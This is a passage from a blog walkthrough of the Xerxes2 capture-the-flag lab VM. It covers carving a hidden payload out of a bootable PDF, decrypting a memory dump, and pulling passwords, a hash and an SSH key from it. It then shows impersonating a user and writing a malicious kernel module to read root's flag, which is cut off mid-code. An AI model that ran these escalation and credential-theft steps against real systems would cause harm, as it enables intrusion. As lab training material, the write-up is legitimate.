 Type: /Font
 Referencing: 14 0 R, 10 0 R</p>

<p>  &lt;&lt;
    /Type /Font
    /Subtype /Type1
    /BaseFont /ZTMOYO+CMTT10
    /FontDescriptor 14 0 R
    /FirstChar 39
    /LastChar 121
    /Widths 10 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 7 0
 Type: /Pages
 Referencing: 3 0 R</p>

<p>  &lt;&lt;
    /Type /Pages
    /Count 1
    /Kids [3 0 R]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 15 0
 Type: /Catalog
 Referencing: 7 0 R</p>

<p>  &lt;&lt;
    /Type /Catalog
    /Pages 7 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 16 0
 Type:
 Referencing:</p>

<p>  &lt;&lt;
    /Producer (pdfTeX-1.40.13)
    /Creator (TeX)
    /CreationDate &ldquo;(D:20140605220405+02&#8217;00&#8217;)&rdquo;
    /ModDate &ldquo;(D:20140605220405+02&#8217;00&#8217;)&rdquo;
    /Trapped /False
    /PTEX.Fullbanner (This is pdfTeX, Version 3.1415926-2.4-1.40.13 (TeX Live 2012
    /Debian ) kpathsea version 6.1.0)</p>

<blockquote><blockquote></blockquote></blockquote>

<p>xref</p>

<p>trailer
  &lt;&lt;
    /Size 17
    /Root 150R
    /Info 160R
    /ID [<F11EC07203BA4D86560A32F64766D9D3><F11EC07203BA4D86560A32F64766D9D3>]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>startxref 26582</p>

<p>PDF Comment &lsquo;%%EOF\n&rsquo;</p>

<p>root@pwk:~#
[/plain]</p>

<p>So, a couple of objects, 2 fonts and an image. The ID&rsquo;s of interest are 999, 1, and 8. pdf-parser can be used to extract objects, so I extracted them all. 1 and 4 resulted in nothing interesting, 8 resulted in a text file that read &ldquo;foo&rdquo;, but 999 extracted as a file that looked like a PDF without headers.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# cat pdf999_b
h?h??!Y??MZt
            ??????????U?u???????r?&ndash;WARNING&ndash;
   Unauthorized file access will be reported.
     XERXES wishes you
          a most productive dayhowhYXh
h7ihhzhOwh45h
@hgIh ,h#ohMZh</p>

<p>hNlhaWhFuhamh
 h: hishd horhswhash phheh
T??U?%PDF-1.5
%????
4 0 obj &lt;&lt;
/Length 292     <br/>
/Filter /FlateDecode</p>

<blockquote><blockquote><p>stream
x?mQ?n?0
        ??+|+H#%I   ?4?ڪu?M\?i
??? ??
      ????????Y?>E?? ?  ??p,(?cJ??{e??&ldquo;y????0MgqY<em>?#(s??M&amp;e6??8?zm?A??????? M??q?&ndash;I?y?uZ^?Z???$?l??*c-tj?????v3ߴ~S?2>[5ZT9???g??M?aU</em>?????䟲??VY??=?n?S?h?r?H?s&amp;`F?ry??ǆ??B/h?????mt?&#8220;?c?V?W??Ƨ?;??|?~ގ1??s5 ?????-9?0
root@pwk:~#
[/plain]</p></blockquote></blockquote>

<p>I used a hexeditor to add the PDF header and footer information</p>

<p>[plain gutter=&ldquo;false&rdquo;]
00000000   83 E0 FF EB  1F 25 50 44  46 2D 31 2E  35 0A 68 E0  08 17 BC 00  10 68 C0 07  &hellip;..%PDF-1.5.h&hellip;&hellip;h..
00000018   1F EB 21 59  81 F9 4D 5A  74 0C B4 0E  86 C1 CD 10  86 C5 CD 10  EB ED BE 55  ..!Y..MZt&hellip;&hellip;&hellip;&hellip;..U
00000030   00 AC 75 02  EB FE B4 0E  CD 10 EB F5  EB 72 E9 2D  2D 57 41 52  4E 49 4E 47  ..u&hellip;&hellip;&hellip;.r.&ndash;WARNING
00000048   2D 2D 0A 20  20 20 55 6E  61 75 74 68  6F 72 69 7A  65 64 20 66  69 6C 65 20  &ndash;.   Unauthorized file
00000060   61 63 63 65  73 73 20 77  69 6C 6C 20  62 65 20 72  65 70 6F 72  74 65 64 2E  access will be reported.
00000078   0A 20 20 20  20 20 58 45  52 58 45 53  20 77 69 73  68 65 73 20  79 6F 75 0A  .     XERXES wishes you.
00000090   20 20 20 20  20 20 20 20  20 20 61 20  6D 6F 73 74  20 70 72 6F  64 75 63 74            a most product
000000A8   69 76 65 20  64 61 79 00  68 6F 77 68  59 58 68 0D  0A 68 37 69  68 68 7A 68  ive day.howhYXh..h7ihhzh
000000C0   4F 77 68 34  35 68 0A 40  68 67 49 68  20 2C 68 23  6F 68 4D 5A  68 0A 0A 68  Owh45h.@hgIh ,h#ohMZh..h
000000D8   4E 6C 68 61  57 68 46 75  68 61 6D 68  0A 20 68 3A  20 68 69 73  68 64 20 68  NlhaWhFuhamh. h: hishd h
000000F0   6F 72 68 73  77 68 61 73  68 20 70 68  68 65 68 0A  54 E9 17 FF  00 00 00 00  orhswhash phheh.T&hellip;&hellip;.
00000108   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000120   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000138   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000150   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000168   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000180   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000198   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
000001B0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
000001C8   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
000001E0   00 00 00 00  00 00 00 00  55 AA 25 50  44 46 2D 31  2E 35 0A 25  D0 D4 C5 D8  &hellip;&hellip;..U.%PDF-1.5.%&hellip;.
000001F8   0A 34 20 30  20 6F 62 6A  20 3C 3C 0A  2F 4C 65 6E  67 74 68 20  32 39 32 20  .4 0 obj &lt;&lt;./Length 292
00000210   20 20 20 20  20 20 0A 2F  46 69 6C 74  65 72 20 2F  46 6C 61 74  65 44 65 63        ./Filter /FlateDec
00000228   6F 64 65 0A  3E 3E 0A 73  74 72 65 61  6D 0A 78 DA  6D 51 C1 6E  83 30 0C BD  ode.>>.stream.x.mQ.n.0..
00000240   E7 2B 7C 2B  48 23 25 49  09 E1 34 A9  DA AA 75 B7  4D 5C A6 69  07 0A A1 A0  .+|+H#%I..4&hellip;u.M.i&hellip;.
00000258   15 C2 20 19  E2 EF 07 0B  91 B6 AA 8A  14 3F DB CF  EF 59 C9 3E  45 DB 03 89  .. &hellip;&hellip;&hellip;.?&hellip;Y.>E&hellip;
00000270   20 C1 09 A7  1C D2 12 08  8D 70 2C 28  F0 98 63 4A  19 A4 05 BC  7B 07 65 DA   &hellip;&hellip;..p,(..cJ&hellip;.{.e.
00000288   C2 0F 22 1A  79 BA AA 07  8B F0 B6 30  4D 67 71 59  5F E4 9D 23  28 73 AE B4  ..&ldquo;.y&hellip;&hellip;0MgqY<em>..#(s..
000002A0   4D 26 65 36  85 A3 38 89  7A 6D 9A 41  96 E6 82 FD  8F F4 19 42  08 88 C0 09  M&amp;e6..8.zm.A&hellip;&hellip;.B&hellip;.
000002B8   4D AC E1 71  F3 2D 2D 49  B6 79 3F 75  5A 5E CD 5A  97 D5 F2 24  F3 6C 16 B3  M..q.&ndash;I.y?uZ^.Z&hellip;$.l..
000002D0   89 2A 1D 63  2D 74 6A 94  FD E0 8A 99  76 33 18 DF  B4 7E 53 C6  32 3E 5B 35  .*.c-tj&hellip;..v3&hellip;~S.2>[5
000002E8   5A 54 39 A0  95 8D 67 A9  AF 4D B2 61  18 55 5F AC  1B F5 F5 FC  04 F7 B7 E4  ZT9&hellip;g..M.a.U</em>&hellip;&hellip;&hellip;
00000300   9F B2 AE 9B  56 59 D3 EA  BA 3D FF 6E  81 1E 53 F4  85 68 18 C2  72 96 48 92  &hellip;.VY&hellip;=.n..S..h..r.H.
00000318   18 73 26 60  17 46 98 72  01 79 83 B6  C7 86 C0 83  42 2F 68 BF  FC 9B F8 F3  .s&amp;<code>.F.r.y......B/h.....
00000330   6D 74 97 60  1E 11 60 82  63 C6 56 AF  57 D9 C8 C6  A7 C2 3B F9  C1 7C CB 7E  mt.</code>..`.c.V.W&hellip;..;..|.~
00000348   DE 8E 31 E6  F5 73 35 20  DE FF 9E DB  E2 07 2D 39  89 30 0A 65  6E 64 73 74  ..1..s5 &hellip;&hellip;-9.0.endst
00000360   72 65 61 6D  0A 65 6E 64  6F 62 6A 20  25 25 45 4F  46 0A                     ream.endobj %%EOF.
[/plain]</p>

<p>I was then able to run this through pdf-parser again to get to object 4. Now, I wont show you that, what I will do is show you this conversation&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
9:34 AM <recrudesce> yeah
9:35 AM <recrudesce> oooh, interesting
9:35 AM <recrudesce> PDF Comment &lsquo;%\xd0\xd4\xc5\xd8\n&rsquo;
9:35 AM <recrudesce> dunno if that&rsquo;s just because of the way i&rsquo;ve made the file
9:39 AM <recrudesce> root@pwk:~# pdf-parser -w out.pdf
9:39 AM <recrudesce> PDF Comment %PDF-1.5
9:39 AM <recrudesce> PDF Comment %????
9:39 AM <recrudesce> obj 4 0
9:39 AM <recrudesce>  Type:
9:39 AM <recrudesce>  Referencing:
9:39 AM <recrudesce>  Contains stream
9:39 AM <recrudesce>   &lt;&lt;
9:39 AM <recrudesce>     /Length 292
9:39 AM <recrudesce>     /Filter /FlateDecode
9:39 AM <recrudesce>   >>
9:39 AM <recrudesce> PDF Comment %%EOF
9:39 AM <recrudesce> so i can see the stream
9:39 AM <recrudesce> OH
9:39 AM <recrudesce> MY
9:39 AM <recrudesce> GOD
9:40 AM <recrudesce>  /F15 9.9626 Tf 125.782 676.223 Td [(Found)-525(this)-525(./dump)-525(file,)-525(thought)-525(you&rsquo;d)-525(find)-525(it)-525(useful.)]TJ 0 -18.929 Td [(I&rsquo;ve)-525(encrypted)-525(it)-525(though,)-525(because)-525(of)-525(the)-525(powers)-525(that)-525(be&hellip;)]TJ 0 -18.929 Td [(You)-525(know)-525(how)-525(to)-525(get)-525(the)-525(password,)-525(right?)]TJ 0 -18.929 Td [(Happy)-525(hunting.)]TJ
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> 200 0 0 200 197.638 405.268 cm
9:40 AM <recrudesce> Q
9:40 AM <recrudesce> BT
9:40 AM <recrudesce> ./F8 9.9626 Tf 249.651 386.339 Td [(Remem)28(b)-28(er,)-333(rem)-1(em)28(b)-28(er)]TJ
9:46 AM <superkojiman> :)
9:46 AM <superkojiman> will play with it tonight. if i start ita t work i won’t get anything done
9:46 AM <recrudesce> i need to decode that file
9:46 AM <recrudesce> where is the qr code ?
9:47 AM <superkojiman> it&rsquo;s in the pdf.
9:47 AM <superkojiman> polito.pdf
9:49 AM <recrudesce> when i open that file i just get blank
9:49 AM <recrudesce> is it one of the streams ?
9:49 AM <recrudesce> ah, it&rsquo;ll be that 200x200 image
9:49 AM <recrudesce> which i&rsquo;ve not been able to get yet
9:49 AM <superkojiman> weird.
9:49 AM <recrudesce> how did you extract it ?
9:49 AM <superkojiman> it just shows on mine. :-/
9:49 AM <recrudesce> the PDF for me is completely blank
9:49 AM <superkojiman> opened it up in kali
9:49 AM <superkojiman> really?
9:49 AM <recrudesce> i&rsquo;ll try again
9:51 AM <superkojiman> i&rsquo;m using epdfview
9:51 AM <superkojiman> apt-get install epdfview
9:52 AM <recrudesce> wtf, it shows now
9:52 AM <superkojiman> :D
9:52 AM <recrudesce> so i just extracted all the text
9:52 AM <superkojiman> was wondering why you were getting all excited when you extracted that.
9:52 AM <superkojiman> i was like &ldquo;but i see it right here&hellip;&rdquo; :D
9:53 AM <recrudesce> i made that a lot more complicated than i needed
9:53 AM <recrudesce> feck
[/plain]</p>

<p>Turns out the PDF I had was corrupt, and that the actual PDF looks like this</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_006.png" alt="xerxes2_006" /></a></p>

<p><img src="http://img3.wikia.nocookie.net/__cb20130417220142/mlp/images/6/61/FANMADE_Derp_by_WorkingOrder.gif" alt="" /></p>

<p>Well didn&rsquo;t I feel stupid ? The QR code decodes as &ldquo;XERXES is watching&hellip;&rdquo;, so that&rsquo;s not of any use either. There&rsquo;s got to be something still hidden in this PDF that I&rsquo;m not seeing.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# file polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0
[/plain]</p>

<p>Wait, wut ? A bootable PDF ?</p>

<p><img src="http://www.reactiongifs.us/wp-content/uploads/2013/12/blinking_sword_in_the_stone.gif" alt="" /></p>

<p>OK, so, how to I boot this PDF I wonder ? Well, turns out this technique has already been used by <a href="https://www.alchemistowl.org/pocorgtfo/pocorgtfo02.pdf">PoC||GTFO with their 2nd edition</a> - check out section 8 to see instructions on using qemu. X11 forwarding required - luckily I set up X11 forwarding ages ago. Using the command found in PoC||GTFO002, I ended up with the following screen</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_007.png" alt="xerxes2_007" /></a></p>

<p>Nice, a password.  Lets get that dump file decrypted.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
polito@xerxes2:~$ gpg &ndash;output output.bin &ndash;decrypt dump.gpg
gpg: CAST5 encrypted data
Enter passphrase: amFuaWNl
pg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
polito@xerxes2:~$ ls -l output.bin
-rw-r&ndash;r&ndash; 1 polito polito 132120576 Aug  8 11:55 output.bin
[/plain]</p>

<p>I am going to assume this is a memory dump, so I figured the first thing to do was to run strings on it - it scrolled text for ages&hellip; I need to be more defined.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
polito@xerxes2:~$ strings output.bin | grep korenchkin
korenchkin.tar.enc
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
1000      2905  0.0  1.1   9268  1480 ?        S    12:43   0:00 sshd: korenchkin@pts/0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
<em>pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
/home/korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
cat /var/mail/korenchkin
</em>pammodutil_getpwnam_korenchkin_2
korenchkin
<em>pammodutil_getpwnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
31 12:46:08 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
korenchkin
korenchkin:$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
May 31 12:41:48 xerxes2 sshd[2749]: Accepted password for korenchkin from 172.16.32.1 port 33385 ssh2
May 31 12:41:48 xerxes2 sshd[2749]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:43:40 xerxes2 sshd[2903]: Accepted password for korenchkin from 172.16.32.1 port 33398 ssh2
May 31 12:43:40 xerxes2 sshd[2903]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
May 31 12:46:08 xerxes2 sshd[2506]: Accepted password for korenchkin from 172.16.32.1 port 33414 ssh2
May 31 12:46:08 xerxes2 sshd[2506]: pam_unix(sshd:session): session opened for user korenchkin by (uid=0)
ts/0korenchkin
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
ts/0korenchkin
sshd: korenchkin [priv]
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
</em>pammodutil_getpwnam_korenchkin_0
sshd: korenchkin@pts/0
/home/korenchkin/.bash_history
sshd: korenchkin
sshd: korenchkin@pts/0
<em>pammodutil_getpwnam_korenchkin_0
cat /var/mail/korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
root: korenchkin
sshd: korenchkin@pts/0
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
ome/korenchkin
cat /home/korenchkin/.ssh/id_rsa
/home/korenchkin/.ssh/id_rsa
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
sshd: korenchkin [priv]
</em>pammodutil_getpwnam_korenchkin_0
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWVtc1RjGcaeVDhmqvN/zQ+T2SoC2fHy+XTAq0HreospZLmKKW/oMeBuKmSJtWaELLqd92c5DVATacYJKbKLwgpGvkXenr7NRIJsLXIs5JVqOVyEt5BSsd0JfNAyK1cfLF2u6/5qcz3OG2R96zUdoXxyHWh1IGc38NUA+NsoBIcola1Y0tlXoYoA8s+RTk/1vn8PMG5NtEs5BklASSXL2fmUnb0QSg7g9G1XbyTucrixSXa+MLRbTfyVuqXHyfuVJwqWmg36kPQSuZJRBeFwlWLqim28tZd8iaL+J16MAv0zEUomo54Z5i2IPCJxbU1knwHy7yiJERJqmqaHaigI9/ korenchkin@xerxes2
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
ts/0korenchkin
2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#114;&#111;&#x6f;&#x74;&#64;&#x78;&#101;&#114;&#x78;&#x65;&#115;&#x32;&#x2e;&#116;&#x72;&#x69;&#111;&#112;&#x74;&#x69;&#109;&#x75;&#109;">&#x72;&#x6f;&#111;&#x74;&#x40;&#120;&#x65;&#114;&#120;&#101;&#115;&#x32;&#46;&#x74;&#114;&#105;&#111;&#x70;&#116;&#x69;&#x6d;&#117;&#109;</a> R=local_user T=mail_spool
]0;korenchkin@x
korenchkin
korenchkin
korenchkin
korenchkin.lock
korenchkin
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
<em>pammodutil_getpwnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
rm /opt/backup/korenchkin.tar
korenchkin.lock.xerxes2.trioptimum.538a05e1.00000a80
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
</em>pammodutil_getpwnam_korenchkin_2
korenchkin
sshd: korenchkin@pts/0
root: korenchkin
korenchkin.l
korenchkin.lock.xerxes2.trioptimum.538a0745.00000995
korenchkin.lock
korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ n
<em>pammodutil_getpwnam_korenchkin_3
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
ts/0korenchkin
cat /var/mail/korenchkin
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
/home/korenchkin0
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb<br/>
]0;korenchkin@x
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ .32.1
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
/home/korenchkin/.terminfo
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$ 6MMMMb\  6MMMMb<br/>
korenchkin
/home/korenchkin
korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
USER=korenchkin
MAIL=/var/mail/korenchkin
PWD=/home/korenchkin
PWD=/home/korenchkin
HOME=/home/korenchkin
LOGNAME=korenchkin
/var/mail/korenchkin
USER=korenchkin
LOGNAME=korenchkin
HOME=/home/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
]0;korenchkin@xerxes2: ~
korenchkin@xerxes2:~$
HOME=/home/korenchkin
/var/mail/korenchkin
MAIL=/var/mail/korenchkin
korenchkin
/home/korenchkin
korenchkin
/home/korenchkin
korenchkin
USER=korenchkin
korenchkin
LOGNAME=korenchkin
/home/korenchkin
/home/korenchkin
/home/korenchkin
</em>pammodutil_getpwnam_korenchkin_1
<em>pammodutil_getspnam_korenchkin_1
</em>pammodutil_getspnam_korenchkin_0
korenchkin
/home/korenchkin
korenchkin
-UN*X-FAIL-korenchkin
/home/korenchkin
korenchkin
korenchkin
polito@xerxes2:~$
[/plain]</p>

<p>That&rsquo;s more workable - but wait, what&rsquo;s that&hellip; a tarball encrypted into /opt/backup/ ?</p>

<p><img src="http://1.bp.blogspot.com/_pS7sKjlzwFg/TOMG_De_jfI/AAAAAAAAGX4/XfN7NH07GiA/s320/quagmire_jackpot.gif" alt="" /></p>

<p>OpenSSL can be used to decrypt the file to get the original tarball.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
polito@xerxes2:~$ openssl aes-256-cbc -d -salt -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out /home/polito/korenchkin/korenchkin.tar
polito@xerxes2:~$ ls -l korenchkin/
total 12
-rw-r&ndash;r&ndash; 1 polito polito 10240 Aug  8 12:05 korenchkin.tar
polito@xerxes2:~$ cd korenchkin/
polito@xerxes2:~/korenchkin$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~/korenchkin$
[/plain]</p>

<p>Looks like Korenchkin is sensible and backs up his keypair&hellip; but now I have it, so user impersonation is possible.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#107;&#x6f;&#x72;&#101;&#110;&#99;&#104;&#107;&#x69;&#110;&#64;&#x31;&#50;&#55;&#46;&#48;&#46;&#48;&#x2e;&#49;">&#x6b;&#111;&#x72;&#x65;&#110;&#x63;&#x68;&#x6b;&#x69;&#x6e;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;</a>
The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;127.0.0.1&rsquo; (ECDSA) to the list of known hosts.</p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>You have new mail.
korenchkin@xerxes2:~$ id
uid=1000(korenchkin) gid=1000(korenchkin) groups=1000(korenchkin),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
korenchkin@xerxes2:~$
[/plain]</p>

<p>Once again, my public key is echo&rsquo;d into .ssh/authorized_keys, and I am able to SSH in from my client.</p>

<hr />

<h2>Holding the Con with Anatoly</h2>

<p><img src="http://img1.wikia.nocookie.net/__cb20120107145214/shodan/images/e/e1/Korenchkin.png" alt="" /></p>

<p>With great power comes great responsibility.  This is <a href="http://shodan.wikia.com/wiki/Anatoly_Korenchkin">Anatoly Korenchkin</a>.</p>

<p>Korenchkin must be able to do some important stuff - after all he worked alongside the captain of the Von Braun. Turns out my suspicion was correct</p>

<p>[plain gutter=&ldquo;false&rdquo;]
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
korenchkin@xerxes2:~$  [/plain]</p>

<p>Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from <a href="http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/">TheGeekStuff</a>. It worked ! But can I make a malicious kernel module - possibly one that can read /root/flag.txt ? Yup, and here&rsquo;s the code to do it.</p>

<p>[c]</p>

<h1>include &lt;linux/module.h>  // Needed by all modules</h1>

<h1>include &lt;linux/kernel.h>  // Needed for KERN_INFO</h1>

<h1>include &lt;linux/fs.h>      // Needed by filp</h1>

<h1>include &lt;asm/uaccess.h>   // Needed by segment descriptors</h1>

<p>int init_module(void)
{
    // Create variables
    struct file *f;
    char buf[1024];
    mm_segment_t fs;
    int i;
    // Init the buffer with 0
    for(i=0;i&lt;1024;i++)
        buf[i] = 0;
    // To see in /var/log/messages that the module is operating
    printk(KERN_INFO &ldquo;My module is loaded\n&rdquo;);
    // I am using Fedora and for the test I have chosen following file
